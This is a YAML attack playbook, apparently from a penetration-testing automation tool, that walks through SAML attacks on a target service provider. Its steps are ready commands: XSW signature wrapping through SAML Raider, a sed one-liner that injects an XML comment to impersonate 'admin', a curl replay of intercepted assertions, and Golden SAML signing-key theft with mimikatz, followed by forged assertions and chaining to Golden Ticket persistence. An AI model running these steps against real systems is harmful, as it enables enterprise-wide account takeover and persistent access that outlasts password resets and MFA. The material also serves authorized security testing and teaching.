id: saml-attacks
name: "Web — SAML attacks (XSW signature wrapping, golden SAML)"
description: >
  SAML's XML-DSig signature is famously brittle. XSW lets you splice a
  forged assertion into a legitimately-signed envelope. With access to
  the IDP's signing key, Golden SAML mints arbitrary assertions = silent
  enterprise-wide AD FS / Okta / OneLogin takeover.
tags: [web, saml, sso, xsw, golden-saml, account-takeover]
difficulty: hard

inputs:
  - name: target_sp
    description: "SAML SP endpoint (ACS / Assertion Consumer Service URL)."
    required: true
  - name: sample_saml_response
    description: "A valid SAMLResponse intercepted in transit (Burp / browser dev tools)."

steps:
  - id: decode_response
    name: "Decode the SAML Response"
    inline_command: |
      # SAMLResponse is base64 + URL-encoded form field.
      echo '<saml_response>' | python3 -c 'import sys, base64, urllib.parse; print(base64.b64decode(urllib.parse.unquote(sys.stdin.read())).decode())'
    inputs:
      saml_response: "${sample_saml_response}"
    notes: |
      Look at: <Subject>, <Conditions> (NotBefore/NotOnOrAfter), <Audience>,
      <AttributeStatement> (roles/groups). The Signature block tells you
      which element is signed — XSW exploits the fact that the SP might
      validate one element and process another.

  - id: xsw_with_samlraider
    name: "Auto-run XSW attacks with SAML Raider (Burp plugin)"
    inline_command: "echo 'In Burp: select the SAMLResponse → SAML Raider tab → Attacks → run XSW1 through XSW8. Forward to SP, watch for an accepted forgery (different Subject, same signature).'"
    notes: |
      8 canonical XSW variants. The SP's XML parser + signature validator
      mismatch is what each one targets — if your SP uses a popular library
      (Spring Security SAML, Shibboleth, etc.), at least one usually lands.

  - id: comment_injection_xsw
    name: "XSW via XML comment injection (Microsoft Active Login)"
    inline_command: |
      # Trick: inject an XML comment inside the username attribute.
      # Signed canonical form sees "admin@target.com<!--x-->" as one string,
      # but the SP's XPath extraction stops at the comment → reads "admin".
      sed 's/<NameID>victim/<NameID>admin<!--/' original.xml | sed 's/victim<\/NameID>/--><\/NameID>/'
    notes: |
      Famous Duo / OneLogin / Shibboleth / Centrify bug from 2018. Worth
      trying any time you control the username field of an existing assertion.

  - id: idp_initiated_replay
    name: "IDP-initiated replay (Conditions missing? Re-use assertions)"
    inline_command: |
      # If NotOnOrAfter is unset or set far in the future + no replay-detection
      # (nonce check), the same SAMLResponse logs you in repeatedly.
      curl -X POST '<sp>' -d "SAMLResponse=<original_response_b64>&RelayState=/"
    inputs:
      sp: "${target_sp}"

  - id: golden_saml
    name: "Golden SAML (post-compromise IDP key extraction)"
    inline_command: |
      # 1) On the IDP server (ADFS): dump the token signing cert + private key.
      Get-AdfsCertificate
      mimikatz "lsadump::trust /patch"
      # 2) Generate arbitrary SAMLResponse signed by that key:
      python3 -c '
      from saml2 import config, server, response, saml, samlp
      # Build assertion as the desired user, sign with stolen key, post to SP.'
    notes: |
      Requires DA on the IDP server. Once you have the key, you can mint
      assertions for ANYONE indefinitely — survives password resets,
      MFA enrollment, even account deletion. The ultimate persistence
      against SSO-dependent infrastructure.

references:
  - title: "PortSwigger — SAML"
    url:   "https://portswigger.net/web-security/saml"
  - title: "Golden SAML (CyberArk)"
    url:   "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps"
  - title: "SAML Raider"
    url:   "https://github.com/CompassSecurity/SAMLRaider"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'Golden SAML succeeded — also have DA on the IDP host'
    reason: 'Layer Golden Ticket + Golden SAML for dual-domain + cloud persistence.'
